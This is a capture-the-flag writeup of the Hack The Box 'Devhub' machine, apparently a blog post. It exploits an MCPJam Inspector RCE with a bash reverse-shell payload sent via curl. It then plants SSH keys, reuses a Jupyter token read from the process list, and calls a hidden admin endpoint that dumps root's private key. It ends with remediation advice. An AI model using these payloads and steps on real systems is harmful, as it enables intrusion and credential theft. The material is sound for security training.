@@ -1,0 +1,365 @@
+export const frontmatter = {
+  title: "Hack The Box Devhub Machine Writeup",
+  slug: "hack-the-box-devhub-machine-writeup",
+  category: "HTB Machine",
+  tags: "MCPJam Inspector, CVE-2026-23744, Jupyter Lab, SSH, Privilege Escalation, MCPJam",
+  description:
+    "Complete walkthrough of the Hack The Box Devhub machine, covering MCPJam Inspector CVE-2026-23744 remote code execution, reverse shell access, Jupyter Lab token extraction, lateral movement to the analyst user, and privilege escalation through a vulnerable root-level operations management script.",
+  date: "2026-10-11",
+};
+
+export const metadata = {
+  title:
+    "Hack The Box Devhub Writeup | MCPJam RCE to Root via Vulnerable Operations Script | loxcalhost",
+  description:
+    "Step-by-step Hack The Box Devhub writeup covering CVE-2026-23744 exploitation in MCPJam Inspector, reverse shell access, Jupyter Lab token extraction, lateral movement, and root privilege escalation through a hardcoded API key and hidden administrative endpoint.",
+};
+
+## Introduction
+
+Devhub is a Linux-based target that highlights the severe risks of exposing insecure development utilities and misconfiguring internal administrative tools. This writeup details the end-to-end exploitation process, demonstrating how a single unpatched public-facing service can lead to full system compromise through a chain of internal pivoting, credential exposure, and insecure custom scripts.
+
+## Overview
+
+The engagement begins with network enumeration, leading to the discovery of an exposed MCPJam Inspector service. This service is vulnerable to an unauthenticated Remote Code Execution flaw (CVE-2026-23744), which is leveraged to secure an initial reverse shell as the `mcp-dev` user.
+
+Post-exploitation enumeration reveals a locally bound Jupyter Lab instance running under the `analyst` user. By analyzing process command-line arguments, an authentication token is recovered. Using SSH local port forwarding, the Jupyter Lab interface is accessed, allowing lateral movement to the analyst account. Finally, privilege escalation to `root` is achieved by analyzing a custom Python administrative script, extracting a hardcoded API key, and exploiting a hidden debugging function to dump the root user's private SSH key.
+
+## Attack Chain
+
+1. **Information Gathering:** Port scanning and service fingerprinting using Nmap and WhatWeb.
+2. **Initial Access:** Exploiting CVE-2026-23744 in MCPJam Inspector to gain a reverse shell.
+3. **Persistence & Tunneling:** Upgrading the shell via SSH keys and establishing local port forwarding.
+4. **Process Enumeration:** Discovering a hardcoded authentication token for an internal Jupyter Lab instance via process listing.
+5. **Lateral Movement:** Authenticating to the tunneled Jupyter Lab service and using its built-in terminal to pivot to the `analyst` user.
+6. **Source Code Analysis:** Identifying a vulnerable, locally bound operations management script (`/opt/opsmcp/server.py`) running as root.
+7. **Privlege Escalation:** Utilizing a hardcoded API key to authenticate to the local script and querying a hidden endpoint to extract the root SSH private key.
+
+## Setup
+
+First, download the VPN configuration file from the platform and establish a connection using OpenVPN:
+```
+sudo openvpn release_arena_au-release-1.ovpn
+```
+
+To confirm that the target machine is reachable across the VPN, we can send a few ICMP echo requests using `ping`:
+```
+ping -c 4 10.129.142.25
+```
+
+Output:
+```
+PING 10.129.142.25 (10.129.142.25) 56(84) bytes of data.
+64 bytes from 10.129.142.25: icmp_seq=1 ttl=63 time=421 ms
+64 bytes from 10.129.142.25: icmp_seq=2 ttl=63 time=326 ms
+64 bytes from 10.129.142.25: icmp_seq=3 ttl=63 time=321 ms
+64 bytes from 10.129.142.25: icmp_seq=4 ttl=63 time=464 ms
+
+--- 10.129.142.25 ping statistics ---
+4 packets transmitted, 4 received, 0% packet loss, time 4005ms
+rtt min/avg/max/mdev = 321.309/389.471/463.610/56.309 ms
+```
+
+Navigating to the target IP address (`10.129.142.25`) in a web browser triggers an automatic redirect to `http://devhub.htb`. However, the connection fails, and the page does not load.
+
+> **Note:** Because `devhub.htb` is a private, unregistered domain, public DNS servers cannot resolve it. We must manually map the target IP to this hostname locally so our system knows where to route the request.
+
+We can resolve this by appending the IP and domain to our local `/etc/hosts` file:
+```
+echo '10.129.142.25    devhub.htb' | sudo tee -a /etc/hosts
+```
+
+Once this entry is added, refreshing the browser allows the domain to resolve properly, granting us access to the web application.
+
+## Enumeration
+
+We begin our enumeration with a full TCP port scan using Nmap to identify open ports and the services running on the target machine:
+```
+nmap -sV -p- 10.129.142.25 -oA scans/full_port_scan
+```
+
+Output:
+```
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-31 13:18 IST                                                                                 
+Nmap scan report for 10.129.130.150                                                                                                             
+Host is up (0.32s latency).                                                                                                                     
+Not shown: 65532 filtered tcp ports (no-response)                                                                                               
+PORT     STATE SERVICE VERSION                                                                                                                  
+22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)                                                            
+80/tcp   open  http    nginx 1.18.0 (Ubuntu)                                                                                                    
+6274/tcp open  unknown   
+```
+
+Based on the Nmap results, the target is running Ubuntu Linux and has three accessible ports:
+- **Port 22 (SSH):** OpenSSH 8.9p1
+- **Port 80 (HTTP):** Nginx 1.18.0
+- **Port 6274:** Unknown service
+
+Since Nmap could not definitively fingerprint the service on port `6274`, we need to investigate it manually. Suspecting it might be an additional web service, we can run a `whatweb` scan against the port using our locally resolved domain:
+```
+whatweb http://devhub.htb:6274
+```
+
+Output:
+```
+http://devhub.htb:6274 [200 OK] Country[RESERVED][ZZ], HTML5, IP[10.129.130.150], Script[module], Title[MCPJam Inspector], UncommonHeaders[access-control-allow-credentials]
+```
+
+The `whatweb` output confirms our theory and successfully identifies the unknown service on port `6274` as **MCPJam Inspector**.
+
+By navigating to the Settings section on `http://devhub.htb:6274`, we identify the service as **MCPJam Inspector v1.4.2**. This version suffers from [CVE-2026-23744](https://github.com/advisories/GHSA-232v-j27c-5pp6), a critical Remote Code Execution (RCE) vulnerability. Because the service listens on all interfaces (`0.0.0.0`) by default and lacks authentication on its API endpoints, we can likely exploit it to gain our initial foothold.
+
+## Foothold
+
+Reviewing the Proof of Concept (PoC) from the GitHub advisory for CVE-2026-23744, we can see that the vulnerability lies in the `/api/mcp/connect` endpoint. The API expects a JSON payload containing a `serverId` and a `serverConfig` object. Within `serverConfig`, we can pass arbitrary commands and arguments that the server will execute.
+
+To exploit this and gain a reverse shell, we will inject a standard Bash reverse shell payload.
+
+First, set up a Netcat listener on your local attack machine to catch the incoming connection:
+```
+nc -lvnp 9001
+```
+
+Next, send the malicious payload using `curl`. Make sure to replace `10.10.14.16` with your actual VPN IP address:
+```
+curl -X POST http://10.129.142.25:6274/api/mcp/connect \
+  -H "Content-Type: application/json" \
+  -d '{
+    "serverConfig": {
+      "command": "bash",
+      "args": ["-c", "bash -i >& /dev/tcp/10.10.14.16/9001 0>&1"],
+      "env": {}
+    },
+    "serverId": "test"
+  }'
+```
+
+Upon successful execution, the Netcat listener will catch the callback, granting us an initial reverse shell as the `mcp-dev` user:
+```
+mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$ 
+```
+
+Standard Netcat reverse shells lack proper terminal features, making them unstable and difficult to work with. Since the target is running an SSH server, we can upgrade our access by dropping our public SSH key into the `mcp-dev` user's `authorized_keys` file.
+
+From the reverse shell, run the following command to create the necessary `~/.ssh` directory, append your public key, and set the proper permissions:
+```
+mkdir -p ~/.ssh && echo "...[YOUR_PUBLIC_KEY_HERE]..." >> ~/.ssh/authorized_keys && chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys  
+```
+
+With the key in place, we can drop the unstable Netcat session and log in securely using SSH:
+```
+ssh -i htb_key mcp-dev@10.129.142.25
+
+```
+We now have a fully interactive and stable SSH session on the target.
+
+## Lateral Movement
+
+While exploring the system, we identified a Jupyter Lab instance running under the `analyst` user account:
+```
+ps aux | grep analyst
+```
+
+Output:
+```
+analyst     1075  0.0  2.4 182532 96436 ?        Ss   09:26   0:05 /home/analyst/jupyter-env/bin/python3 /home/analyst/jupyter-env/bin/jupyter-lab --ip=127.0.0.1 --port=8888 --no-browser --notebook-dir=/home/analyst/notebooks --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7 --ServerApp.password= --ServerApp.allow_origin= --ServerApp.disable_check_xsrf=False
+root        1084  0.0  0.7  37376 28840 ?        Ss   09:26   0:01 /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
+mcp-dev     1745  0.0  0.0   6480  2364 pts/0    S+   11:09   0:00 grep --color=auto analyst
+```
+
+The process is bound to `127.0.0.1` on port `8888`. To interact with this, we need to tunnel the port to our local machine.
+
+If you have enabled `EnableEscapeCommandline yes` in your `~/.ssh/config` or via command-line arguments, you can trigger the SSH control interface by pressing `Enter`, followed by `~C`:
+1. Press `Enter`, then type `~C`.
+2. At the `ssh>` prompt, enter the port forward command:
+```
+-L 8888:127.0.0.1:8888
+```
+
+Navigate to `http://localhost:8888` in your browser. When prompted for authentication, provide the token extracted from the process listing:
+```
+a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
+```
+
+Once authenticated, navigate to the **Terminal** option located under the **Other** section in the Jupyter Lab interface. This provides us with a shell running as the analyst user.
+
+To gain stable, persistent access as `analyst`, we will again utilize SSH keys. Within the Jupyter terminal, execute the following:
+```
+mkdir -p ~/.ssh && echo "...[YOUR_PUBLIC_KEY_HERE]..." >> ~/.ssh/authorized_keys && chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys  
+```
+
+Now, log in as analyst from your local machine:
+```
+ssh -i analyst_key analyst@10.129.142.25
+```
+
+With our elevated session, we can retrieve the user flag:
+```
+cat /home/analyst/user.txt
+```
+
+Output:
+```
+▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
+```
+
+## Privilege Escalation
+
+With stable access as the `analyst` user, we continue enumerating the system for a path to root. We can use our refined `ps` command to look for interesting processes running as the root user:
+```
+ps aux | grep root | grep -v "\["
+```
+
+Output:
+```
+...[SNIP]...
+root        1084  0.0  0.7  37376 28840 ?        Ss   09:26   0:02 /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
+...[SNIP]...
+```
+We see a Python script (`/opt/opsmcp/server.py`) running as root. Checking the permissions on this file reveals that our current user, `analyst`, has read access:
+```
+ls -l /opt/opsmcp/server.py
+```
+
+Output:
+```
+-rw-r----- 1 analyst analyst 6021 Mar 16 21:49 /opt/opsmcp/server.py
+```
+
+Since we can read the file, we can inspect the source code of this internal operations management tool.
+```
+cat /opt/opsmcp/server.py
+```
+
+Output (Truncated for brevity):
+```
+
+
+...[SNIP]...
+
+
+VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"                                                                             
+
+
+...[SNIP]...
+
+
+HIDDEN_TOOLS = {
+    "ops._admin_dump": {
+        "description": "Emergency credential dump - INTERNAL ONLY",
+        "parameters": {"target": "string", "confirm": "boolean"} 
+    },
+    "ops._debug_mode": {
+        "description": "Enable debug mode",
+        "parameters": {}
+    }
+}
+
+
+...[SNIP]...
+
+
+def check_auth():
+    """Check API key authentication"""
+    api_key = request.headers.get('X-API-Key', '')
+    return api_key == VALID_API_KEY
+
+
+...[SNIP]...
+
+
+    elif tool_name == "ops._admin_dump":
+        target = args.get('target', '')
+        confirm = args.get('confirm', False)
+
+
+...[SNIP]...
+
+
+        if target == "ssh_keys": 
+            try:
+                with open('/root/.ssh/id_rsa', 'r') as f:
+                    key_data = f.read()
+                return jsonify({ 
+                    "target": "ssh_keys",
+                    "root_private_key": key_data,
+                    "note": "Emergency recovery key dump"
+                })
+            except Exception as e:
+                return jsonify({ 
+                    "target": "ssh_keys",
+                    "error": f"Could not read key: {str(e)}"
+                })
+
+
+...[SNIP]...
+
+
+if __name__ == '__main__':
+    app.run(host='127.0.0.1', port=5000, debug=False)
+```
+
+Analyzing the script reveals several critical pieces of information:
+1. The service runs locally on port `5000`.
+2. It expects an authentication header: `X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a`.
+3. There is a hidden endpoint/tool named `ops._admin_dump`.
+4. If we call `ops._admin_dump` and pass the target `ssh_keys`, the script will read `/root/.ssh/id_rsa` and return the root user's private SSH key in a JSON response.
+
+First, we need to forward the internal port 5000 to our local machine. Using the SSH tunnel techniques established earlier, we open a new tunnel for port `5000`:
+```
+-L 127.0.0.0.1:5000
+```
+
+With the port forwarded, we can craft a `curl` request from our local machine to trigger the emergency credential dump:
+```
+curl -X POST http://localhost:5000/tools/call   -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a"   -H "Content-Type: application/json"   -d '{
+    "name": "ops._admin_dump",
+    "arguments": {
+      "target": "ssh_keys",
+      "confirm": true
+    }
+  }'
+```
+
+This successfully extracts the JSON response containing the private key and saves it to a file named `root_raw`.
+
+The key inside `root_raw` is formatted as a single JSON string with literal `\n` characters instead of actual line breaks. SSH will reject the key in this format. We can use `jq` with the `-r` (raw) flag to parse the JSON and format the key correctly:
+```
+jq -r '.root_private_key' root_raw > root_key
+```
+
+Finally, we set the strict permissions required by SSH, log in as the root user:
+```
+chmod 600 root_key
+ssh -i root_key root@10.129.142.25
+```
+
+Retrieve the root flag:
+```
+cat /root/root.txt
+```
+
+Output:
+```
+▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
+```
+
+> **Note on OPSEC:** Before concluding the engagement, remember to clean up your tracks. Remove your public SSH keys from the `authorized_keys` files of both the `mcp-dev` and `analyst` users, and terminate your initial reverse shell. While often skipped in CTF environments, proper post-exploitation cleanup is a critical requirement in real-world assessments to ensure you do not leave accidental backdoors behind.
+
+## Remediation & Recommendations
+
+To secure this environment, the following remediation steps should be implemented:
+- **Patch Management:** Immediately update the MCPJam Inspector software to a patched version that resolves CVE-2026-23744. Administrative or debugging interfaces should never be exposed to external networks without strict access controls and authentication.
+- **Secure Credential Handling:** Do not pass sensitive tokens or passwords via command-line arguments (as seen with the Jupyter Lab instance). Command-line arguments are visible to all users on a Linux system via the process list (`ps`). Instead, use environment variables or secure configuration files with strict read permissions.
+- **Remove Hardcoded Secrets:** The `/opt/opsmcp/server.py` script contains a hardcoded API key (`VALID_API_KEY`). Secrets should be removed from source code and managed via a dedicated secrets management solution or secure environment variables.
+- **Principle of Least Privilege:** The inclusion of an emergency `ops._admin_dump` tool that blindly returns the root SSH private key is a critical design flaw. This functionality should be entirely removed from the application. If emergency access is required, it should be handled through standardized, heavily audited break-glass procedures, not an API endpoint.
+
+## MITRE ATT&CK Mapping
+
+- **Initial Access** — Exploit Public-Facing Application (**T1190**): Exploited CVE-2026-23744 in MCPJam Inspector to execute arbitrary code.
+- **Execution** — Command and Scripting Interpreter: Unix Shell (**T1059.004**): Used a Bash reverse shell payload for initial access.
+- **Command and Control** — Proxy (**T1090**): Utilized SSH local port forwarding to access internally bound services on ports `8888` and `5000`.
+- **Discovery** — Process Discovery (**T1057**): Analyzed the process list via ps aux to locate the Jupyter Lab token and the vulnerable root script.
+- **Credential Access** — Unsecured Credentials: In Files (**T1552.001**): Discovered a hardcoded API key inside the `/opt/opsmcp/server.py` source code.
+- **Credential Access** — Unsecured Credentials: Private Keys (**T1552.004**): Extracted the root user's `id_rsa` private key via the vulnerable API endpoint.
+- **Lateral Movement** — Valid Accounts: Local Accounts (**T1078.003**): Dropped SSH public keys into configuration files to maintain stable access and move laterally between `mcp-dev`, `analyst`, and `root`.
